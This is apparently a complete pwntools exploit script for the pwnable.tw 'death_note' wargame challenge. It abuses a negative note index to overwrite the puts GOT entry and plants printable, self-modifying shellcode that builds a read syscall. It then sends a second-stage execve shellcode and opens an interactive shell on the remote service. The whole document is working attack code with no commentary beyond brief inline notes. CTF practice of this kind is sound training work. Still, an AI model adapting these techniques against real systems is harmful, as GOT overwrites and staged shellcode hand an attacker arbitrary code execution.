import sys
from pwn import *

binary_name = './death_note'
context.binary = binary_name
e = ELF(binary_name)

r = remote('chall.pwnable.tw', 10201)


"""
1. Add a name
2. show a name on the note
3. delete a name int the note
4. Exit
"""
note_addr = 0x0804A060

## strdup use malloc a memory to duplicate the string, and return mem addr
## no release
def add(idx, name):
    r.sendlineafter('choice :', '1')
    r.sendlineafter('Index :', idx) # < 10
    r.sendlineafter('Name :', name) # 31~126

def del_note(idx):
    r.sendlineafter('choice : ', '3')
    r.sendlineafter('Index :', idx) # < 10

def show(idx):
    r.sendlineafter('choice : ', '2')
    r.sendlineafter('Index :', idx) # < 10

offset = (note_addr - e.got['puts']) // 4 # offset = 0x10
log.info("Our target is that changing the eax to " + hex(e.got['puts']))

## need printable shellcode and len(sc) < 80 QQ
## target: read(0, buffer_addr, XX)
## eax 3
## ebx 0
## ecx buffer_addr
## edx XX
## int 0x80 (cd 80)

sc = """
## cd == 0xcd ^ 0xff ^ 0x32

##### set ecx == buffer_addr == shellcode_addr #####
push edx
pop ecx # set ecx to buffer_addr

##### make ecx+0x30 == 0xff #####
push 0x41
pop eax
xor al, 0x41
dec eax
xor BYTE PTR [ecx+0x30], al

##### make ecx+0x30 == 0xff ^ 0x32 == 0xcd #####
push 0x32
pop eax
xor BYTE PTR [ecx+0x30], al

##### make ecx+0x31 == 0x80 #####
push 0x7e
pop eax
inc eax
inc eax
xor BYTE PTR [ecx+0x31], al

##### make eax == 0x3 #####
push 0x37
pop eax
xor al, 0x34"""

asm_sc = asm(sc).ljust(48, b'A')


add(str(-offset), asm_sc)
r.sendline(b'L'*50 + asm(shellcraft.sh()))
r.interactive()